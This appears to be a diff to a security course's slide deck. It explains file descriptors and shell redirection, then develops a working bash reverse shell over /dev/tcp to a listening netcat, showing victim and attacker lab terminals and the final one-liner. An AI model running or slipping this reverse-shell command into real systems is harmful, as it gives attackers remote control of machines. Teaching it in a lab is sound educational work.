@@ -443,7 +443,224 @@ root@metasploit:~#
 </textarea></section>
     
 <section data-markdown data-separator="^\n\n\n"><textarea data-template>
-## ...
+## File Descriptors
+- An integer that the OS maps to an open file
+- All programs start with three:
+  - 0: stdin (standard input)
+  - 1: stdout (standard output)
+  - 2: stderr (standard error)
+- When you open a file, it creates a file descriptor starting at 3
+- C makes these explicit; Python wraps them in a class
+
+
+
+<!-- .slide: class="small-pre" -->
+## File Descriptors ([fd.c](code/fd.c.html))
+```
+$ cat fd.c        
+#include <stdio.h>
+#include <fcntl.h>
+#include <unistd.h>
+int main() {
+  char *output = "hello world\n";
+  int fd = open("fd.out",O_CREAT|O_WRONLY|O_TRUNC);
+  printf("file descriptor: %d\n",fd);
+  write(fd, output, 12);
+  close(fd);
+  return 0;
+}
+$ clang -o fd fd.c
+$ ./fd            
+file descriptor: 3
+$ chmod 644 fd.out
+$ cat fd.out      
+hello world
+$ 
+```
+- This is a very low-level interface; C's `fopen()` is not as annoying to use
+
+
+
+## Redirection Output
+```
+$ echo "hello world" > output.txt
+$ cat output.txt
+hello world
+$
+```
+- This redirects the output of the command into `output.txt`
+- Equivalent command:
+```
+echo "hello world" 1> output.txt
+```
+- Note we are specifying *which* FD to use
+  - Although we are still using the default (stderr)
+
+
+
+## Redirection Input
+```
+$ a.out < input.txt
+$
+```
+- This redirects the contents of `input.txt` as the input of the `a.out` program
+- Equivalent command:
+```
+$ a.out 0< input.txt
+```
+- Note we are specifying *which* FD to use
+  - Although we are still using the default (stdin)
+
+
+
+## `>` versus `>&`
+- The `>` operator redirects output to a new "thing"
+  - File, process, etc.
+- The `>&` operator redirects output to an already opened "thing"
+  - An already open connection or pipe, etc.
+  - This is not file appending (that's `>>`)
+
+
+
+## Combining FDs
+<!-- .slide: class="small-pre" -->
+- Putting `2>&1` will redirect stderr to stdout:
+```
+$ ls -F
+directory/ file
+
+$ grep test *
+grep: directory: Is a directory
+file:this is a test
+
+$ grep test * > output.txt
+grep: directory: Is a directory
+$ cat output.txt 
+file:this is a test
+
+$ grep test * 2> output.txt
+file:this is a test
+$ cat output.txt 
+grep: directory: Is a directory
+
+$ grep test * > output.txt 2>&1
+$ cat output.txt 
+grep: directory: Is a directory
+file:this is a test
+```
+
+
+
+<!-- .slide: class="small-pre" -->
+## Linux & TCP Refresher
+- Running `nc -l 4760` will listen on port 4760, and print any output received
+- In Linux, we can write to `/dev/tcp/<IP>/<port>` to send data to that IP & port
+```
+root@outer1:~# echo "hello world" > /dev/tcp/192.168.100.102/4760
+root@outer1:~# 
+```
+```
+root@outer2:~# nc -l 4760
+hello world
+root@outer2:~# 
+```
+
+
+
+<!-- .slide: class="small-pre" -->
+## Reverse Shell attempt 1
+*outer1* is the victim machine:
+```
+root@outer1:/# bash -i > /dev/tcp/192.168.100.102/4760
+root@outer1:/# hostname
+root@outer1:/# ls -l
+root@outer1:/# exit
+exit
+root@outer1:/# 
+```
+*outer2* is the attacker machine:
+```
+root@outer2:~# nc -l 4760
+outer1
+lrwxrwxrwx   1 root root     7 Jan 25 09:04 bin -> usr/bin
+drwxr-xr-x   2 root root  4096 Apr 18  2022 boot
+...
+root@outer2:~# 
+```
+
+
+
+## Reverse Shell attempt 1
+![](http://www.cs.virginia.edu/~asb2t/duimg/n14/image19.png)
+- This only redirects stdin
+
+
+
+<!-- .slide: class="small-pre" -->
+## Reverse Shell attempt 2
+*outer1* is the victim machine (note the `0<&1`):
+```
+root@outer1:/# bash -i > /dev/tcp/192.168.100.102/4760 0<&1
+root@outer1:/# ls -l
+root@outer1:/# 
+```
+*outer2* is the attacker machine:
+```
+root@outer2:/# nc -l 4760
+hostname
+outer1
+ls -l
+total 116
+lrwxrwxrwx   1 root root     7 Jan 25 09:04 bin -> usr/bin
+drwxr-xr-x   2 root root  4096 Apr 18  2022 boot
+...
+^C
+root@outer2:/# 
+```
+
+
+
+## Reverse Shell attempt 2
+![](http://www.cs.virginia.edu/~asb2t/duimg/n14/image20.png)
+- This takes stdin from the attacker (*outer2*) and prints the output to the attacker
+- This also printed the command on the victim machine
+- But what about stderr?
+
+
+
+<!-- .slide: class="small-pre" -->
+## Reverse Shell attempt 3
+*outer1* is the victim machine (note the `2<&1`):
+```
+root@outer1:/# bash -i > /dev/tcp/192.168.100.102/4760 0<&1 2>&1
+root@outer1:/# 
+```
+*outer2* is the attacker machine:
+```
+root@outer2:/# nc -l 4760
+root@outer1:/# hostname
+hostname
+outer1
+root@outer1:/# ls -l
+ls -l
+total 116
+-rwxr-xr-x   1 root root  9040 Mar 28 21:02 a.out
+lrwxrwxrwx   1 root root     7 Jan 25 09:04 bin -> usr/bin
+...
+root@outer1:/# ^C
+root@outer2:/# 
+```
+
+
+
+
+## Reverse Shell attempt 3
+![](http://www.cs.virginia.edu/~asb2t/duimg/n14/image23.png)
+The final version:
+```
+bash -i > /dev/tcp/192.168.100.102/4760 0<&1 2>&1
+```
+It's that easy, and can be run as a non-root user
 </textarea></section>
 
 </section>
